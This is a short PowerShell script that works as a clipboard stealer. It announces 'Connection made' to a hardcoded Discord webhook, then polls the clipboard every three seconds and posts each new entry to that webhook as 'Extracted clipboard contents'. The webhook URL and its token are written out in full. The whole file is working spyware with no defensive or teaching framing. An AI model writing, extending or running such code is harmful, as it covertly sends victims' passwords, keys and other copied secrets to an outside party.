$prev_clip = Get-Clipboard -Raw

$dc = "https://discord.com/api/webhooks/1140612515286499399/u5g7s3uMCSoJNCr3chf8xqpb94Jh2lYbhn7Lrw3_jqjfxXuNUUiNACq2VNtE4UaR-dkH"

$body = @{
    content = "Connection made"
}

Invoke-RestMethod -Uri $dc -Method Post -Body $body

while($true) {
    try {
        $clip = Get-Clipboard -Raw
    } catch {
        Write-Host "Error: $_"
    }
    
    if ( $clip -ne $prev_clip ) {

        Write-Output "Clipboard: $clip"
        $prev_clip = $clip

        $clip_length = $clip | Measure-Object -Character | Select-Object -ExpandProperty Characters
        Write-Output $clip_length

        if ( $clip_length -gt 2000 ) {
            Write-Output "Length over 2000"
            $content = "Users clipboard contents exceeded 2000 characters, unable to send (will be fixed in future update)"
        }
        else {
            $content = "Extracted clipboard contents: ``````$clip``````"
        }

        $body = @{
            content = $content
        }

        Invoke-RestMethod -Uri $dc -Method Post -Body $body

    }

    Start-Sleep -Seconds 3
}
